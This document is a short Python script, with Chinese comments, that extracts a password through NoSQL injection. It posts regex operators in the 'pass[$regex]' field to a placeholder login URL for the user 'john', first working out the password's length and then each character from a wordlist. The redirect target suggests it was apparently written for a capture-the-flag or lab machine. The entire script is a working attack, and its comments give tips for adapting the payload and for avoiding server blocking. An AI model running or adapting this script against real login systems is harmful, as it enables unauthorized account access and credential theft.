import requests
import time

#初始参数
head={
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
    }
url = "http://XXXXX/login.php"  #爆破URL

def check_if_success(response): #判断请求是否成功的函数
    if "Location" in response.headers:  #可根据需求更改
        return "sekr3tPl4ce.php" in response.headers["Location"]
    return False

#分析密码位数
file1 = open("/root/Desktop/numberonly.txt","r").read().split("\n")
for num in file1:
        #time.sleep(1)延迟可以防止被服务器封锁
        data = {
            "user" : "john",
            "pass[$regex]" : "^.{"+num+"}$", #爆破payload可以据需求更改
            "remmember" : "on"
        }
        res = requests.post(url, headers=head, data=data, allow_redirects=False)  # 记住要禁止重定向
        if check_if_success(res):
          print("password_size="+num)
          password_size=int(num.strip())
          break

#爆破密码
j = 0
passwordchar = ['.'] * password_size  #初始化密码长度
while j < password_size:
            #time.sleep(1)
            file2 = open("/root/Desktop/wordlist.txt","r").read().split("\n")
            for i in file2:
                #time.sleep(1)
                passwordchar[j] = i
                data = {
                    "user" : "john",
                    "pass[$regex]" : "^"+''.join(passwordchar[0:password_size])+"$",#爆破payload可以据需求更改
                    "remmember" : "on"
                }
                res = requests.post(url, headers=head, data=data, allow_redirects=False)
                if check_if_success(res):
                        passwordchar[j] = i
                        print("password=" + ''.join(passwordchar[0:password_size]))
                        j += 1
                        if '.' not in passwordchar: exit()
